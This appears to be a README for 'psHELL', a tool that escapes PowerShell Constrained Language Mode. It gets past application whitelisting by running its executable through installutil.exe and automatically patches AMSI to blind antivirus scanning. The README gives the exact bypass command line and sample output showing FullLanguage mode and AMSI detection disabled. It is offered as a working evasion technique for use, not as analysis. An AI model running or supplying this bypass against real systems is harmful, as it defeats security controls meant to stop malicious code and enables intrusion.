## psHELL ##

Sometimes its better to drop down from a constrained language prompt into a full language prompt to poke around and understand the lay of the land better. This tool


1. Confirm that you are in a constrained language mode

```
PS > $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```
2. Execute the application whitelisting bypass

```
PS C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\psHell.exe
```

3. If all goes well you will be dropped inside an interactive prompt

```
psHell >$ExecutionContext.SessionState.LanguageMode
FullLanguage
```
4. execute some ps cmdlets

```
psHell >echo $psversiontable

Name                           Value                                                                                    
----                           -----                                                                                    
PSVersion                      5.1.19041.2673                                                                           
PSEdition                      Desktop                                                                                  
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}                                                                  
BuildVersion                   10.0.19041.2673                                                                          
CLRVersion                     4.0.30319.42000                                                                          
WSManStackVersion              3.0                                                                                      
PSRemotingProtocolVersion      2.3                                                                                      
SerializationVersion           1.1.0.1  

```

5. Verify AMSI patching, before execution.

```

PS > amsiscanbuffer
At line:1 char:1
+ amsiscanbuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

6. Invoking the tool with Appwhitelist bypass and automatic patching, indicating no cmdlet or function for amsiscanbuffer test.

```
PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U .\psHell.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.9037.0
Copyright (C) Microsoft Corporation.  All rights reserved.

Reached here!
psHell >amsiscanbuffer
The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
psHell >

```
